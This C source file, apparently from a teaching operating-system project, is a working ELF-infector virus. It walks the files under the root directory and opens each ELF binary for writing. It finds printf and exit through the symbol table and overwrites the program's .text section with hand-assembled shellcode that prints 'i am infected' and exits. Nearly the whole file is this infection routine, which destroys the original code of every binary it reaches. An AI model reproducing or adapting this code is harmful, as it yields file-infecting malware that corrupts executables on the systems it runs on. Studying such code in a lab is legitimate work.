#include "myelf.h"
#include "stdio.h"
#include "string.h"

int strncmp(char* a, char* b, int n) {
    int i = 0;
    for (i = 0; i < n; i++) {
        if (a[i] != b[i]) {
            return 1;
        }
    }
    return 0;
}

int is_elf(Elf32_Ehdr elf_ehdr) {
    // ELF文件头部的 e_ident 为 "0x7fELF"
    if ((strncmp(elf_ehdr.e_ident, ELFMAG, SELFMAG)) == 0)
        return 1;  // 是
    else
        return 0;  // 不是
}

void cal_addr(int entry, int addr[]) {
    int temp = entry;
    int i;
    for (i = 0; i < 4; i++) {
        addr[i] = temp % 256;  // 256 == 8byte
        temp /= 256;
    }
}

int main() {
    char files[500];
    memset(files, 0, 500);
    search_dir("/", files);  // 读当前目录
    files[strlen(files)] = ' '; // 在最后加一个空格，方便分割字符串
    // printf("the files are : %s\n", files);
    int i = 0;
    int last = 0;
    char temp[200];
    int count = 0;
    // ELF Header Table 结构体
    Elf32_Ehdr elf_ehdr;
    // Program Header Table 结构体
    Elf32_Shdr elf_shdr;
    Elf32_Sym elf_sym;

    for (i = 0; i < strlen(files); i++) {
        if (files[i] == ' '  && files[i - 1] != ' ' )  {
            // printf("%d  ", i);
            int j = last;
            last = i + 1;  // 进行一个字符串分隔
            if(i <= 1 ) continue;
            for (; j < i; j++) {
                temp[count++] = files[j];
            }
            
            temp[count] = '\0';
            printf("start attacking: %s\n", temp);
            
            // printf("start attacking: %s\n", temp);
            if (strncmp(temp, "dev", 3) != 0 &&
                strncmp(temp, "kernel.bin", 10) != 0) {  // 下面是感染过程
                // 不读驱动 不读kernel.bin
                int old_file = open(temp, O_RDWR);
                
                read(old_file, &elf_ehdr, sizeof(elf_ehdr));
                // 判断是否是一个 ELF 文件
                printf("%s,", temp);
                if (is_elf(elf_ehdr)) {
                    printf("it is a ELF , attacking\n");
                    int e_sho_off = elf_ehdr.e_shoff;
                    int section_num = elf_ehdr.e_shnum;
                    int new_offset = lseek(old_file, e_sho_off + sizeof(elf_shdr), SEEK_SET);
                    // 定位到text节的位置
                    read(old_file, &elf_shdr, sizeof(elf_shdr));  //读出text节
                    int text_offset = elf_shdr.sh_offset;  // 找到代码段的偏移
                    // printf("it is a ELF , attacking2\n");
                    lseek(old_file, e_sho_off + sizeof(elf_shdr) * 7, SEEK_SET);
                    read(old_file, &elf_shdr,
                         sizeof(elf_shdr));  // 读出strtab节
                    int str_offset = elf_shdr.sh_offset;  // 找到strtab的段的偏移
                    // 修正：正确获取符号表和对应字符串表
                    Elf32_Shdr symtab_shdr;
                    int found_symtab = 0;
                    int symtab_link = -1;
                    lseek(old_file, e_sho_off, SEEK_SET);
                    for (int idx = 0; idx < section_num; idx++) {
                        read(old_file, &elf_shdr, sizeof(elf_shdr));
                        if (elf_shdr.sh_type == 2) {
                            symtab_shdr = elf_shdr;
                            symtab_link = elf_shdr.sh_link;
                            found_symtab = 1;
                            break;
                        }
                    }
                    if (!found_symtab) {
                        printf("not found symtab\n");
                        continue;
                    }
                    // 再次遍历，找到sh_link对应的字符串表
                    Elf32_Shdr strtab_shdr;
                    int found_strtab = 0;
                    lseek(old_file, e_sho_off, SEEK_SET);
                    for (int idx = 0; idx < section_num; idx++) {
                        read(old_file, &elf_shdr, sizeof(elf_shdr));
                        if (idx == symtab_link) {
                            strtab_shdr = elf_shdr;
                            found_strtab = 1;
                            break;
                        }
                    }
                    if (!found_strtab) {
                        printf("not found strtab for symtab\n");
                        continue;
                    }
                    // 读取字符串表内容
                    char str_buf[4096];
                    lseek(old_file, strtab_shdr.sh_offset, SEEK_SET);
                    read(old_file, str_buf, sizeof(str_buf));
                    // 读取符号表并查找
                    int sym_num = symtab_shdr.sh_size / sizeof(Elf32_Sym);
                    lseek(old_file, symtab_shdr.sh_offset, SEEK_SET);
                    int i = 0;
                    unsigned int printf_address, exit_address;
                    int printf_flag = 0, exit_flag = 0;
                   // printf("it is a ELF , attacking5,sym_num = %d\n", sym_num);
                    for (i = 0; i < sym_num; i++) {
                        read(old_file, &elf_sym, sizeof(elf_sym));
                        if (strcmp(str_buf + elf_sym.st_name, "printf") == 0) {
                            printf_flag = 1;
                            printf_address = elf_sym.st_value;
                        }
                        if (strcmp(str_buf + elf_sym.st_name, "exit") == 0) {
                            exit_flag = 1;
                            exit_address = elf_sym.st_value;
                        }
                        if (printf_flag && exit_flag) {
                            break;
                        }
                    }
                   // printf("it is a ELF , attacking6\n");
                    if (i == sym_num) {
                        printf("not find printf or not find exit\n");
                    }

                    int printf_offset =
                        printf_address - (text_offset + 0x12 + 5);
                    int exit_offset = exit_address - (text_offset + 0x1e + 5);
                    // +5 是打断点算出来的

                    int printf_off[4];
                    cal_addr(printf_offset, printf_off);

                    int exit_off[4];
                    cal_addr(exit_offset, exit_off);

                    int data_addr[4];
                    cal_addr(text_offset + 35, data_addr);

                    char shellcode[] = {
                        0x66,          0x87,
                        0xdb,                 // xchg bx,bx
                        0x89,          0xe5,  // mov ebp,esp
                        0x83,          0xe4,
                        0xf0,  // and esp, 0xfffffff0
                        0x83,          0xec,
                        0x10,  // sub esp, 0x00000010
                        0xc7,          0x04,          0x24,
                        data_addr[0],  data_addr[1],  data_addr[2],
                        data_addr[3],  // mov ss[esp],string address
                        0xe8,          printf_off[0], printf_off[1],
                        printf_off[2],
                        printf_off[3],  // call printf();
                        0xc7,          0x04,          0x24,
                        0x00,          0x00,          0x00,
                        0x00,  // mov ss[esp],0
                        0xe8,          exit_off[0],   exit_off[1],
                        exit_off[2],
                        exit_off[3],  // call exit();
                        0x69,          0x20,          0x61,
                        0x6d,          0x20,          0x69,
                        0x6e,          0x66,          0x65,
                        0x63,          0x74,          0x65,
                        0x64,          0x0A,
                        0x00  // string　"i am infected"
                    };
                    lseek(old_file, text_offset, SEEK_SET);
                    write(old_file, shellcode, sizeof(shellcode));
                    printf("infecting successfully\n");
                } else {
                    printf(" it is not a ELF\n");
                }
            }
            else {
                printf("skip dev or kernel.bin\n");
            }
            count = 0;
        }
    }
    // __asm__ __volatile__("xchg %bx, %bx");
}
